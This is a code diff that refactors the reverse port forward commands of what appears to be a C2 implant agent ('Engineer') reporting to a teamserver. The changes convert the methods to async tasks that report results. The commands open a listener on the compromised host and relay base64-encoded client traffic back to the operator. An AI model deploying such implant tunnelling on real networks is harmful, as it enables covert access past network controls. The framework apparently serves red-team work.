@@ -1,4 +1,5 @@
 ﻿using Engineer.Commands;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Concurrent;
@@ -19,7 +20,7 @@ namespace Engineer.Commands
         public static readonly ConcurrentDictionary<string, ConcurrentQueue<byte[]>> rPortClientData = new(); // key is the client id, queue holds data to give back to client from ts. 
         internal static CancellationTokenSource _tokenSource = new();
         
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             //parse the bindport argument and open a tcp listener on that port
             task.Arguments.TryGetValue("/bindport", out var bindport);
@@ -28,7 +29,7 @@ namespace Engineer.Commands
             client = client.TrimStart(' ');
             rportForward.rPortClientData.TryAdd(client, new ConcurrentQueue<byte[]>());
             Task.Run(async ()=> await HandleSendRecive(bindport,client));
-            return "Starting Reverse Port Forward on engineers host at port " + bindport;
+            Tasking.FillTaskResults("Starting Reverse Port Forward on engineers host at port " + bindport, task, EngTaskStatus.Running);
         }
 
         private static async Task HandleSendRecive(string bindPort, string client)
@@ -66,7 +67,7 @@ namespace Engineer.Commands
                                 File = dataToSend
                             };
                             Program.InboundCommandsRec += 1;
-                            Task.Run(async () => await Program.DealWithTask(task));
+                            Task.Run(async () => await Tasking.DealWithTask(task));
                         }
                     }
                     await Task.Delay(10);
@@ -84,7 +85,7 @@ namespace Engineer.Commands
     {
         public override string Name => "rportRecieve";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             //take in data from the teamserver and send it to the client 
             task.Arguments.TryGetValue("/client", out var client);
@@ -98,7 +99,7 @@ namespace Engineer.Commands
                 rportForward.rPortClientData.TryAdd(client, new ConcurrentQueue<byte[]>());
                 rportForward.rPortClientData[client].Enqueue(task.File);
             }
-            return "Data queued for client";
+            Tasking.FillTaskResults("Data queued for client",task,EngTaskStatus.Complete);
 
         }
     }
@@ -108,11 +109,11 @@ namespace Engineer.Commands
         public override string Name => "rportsend";
 
         //is used to send the data to the TS from the client
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             task.Arguments.TryGetValue("/client", out string client);
             var data = task.File;
-            return Convert.ToBase64String(data) + "\n" + client;
+            Tasking.FillTaskResults(Convert.ToBase64String(data) + "\n" + client,task,EngTaskStatus.Complete);
         }
     }
     
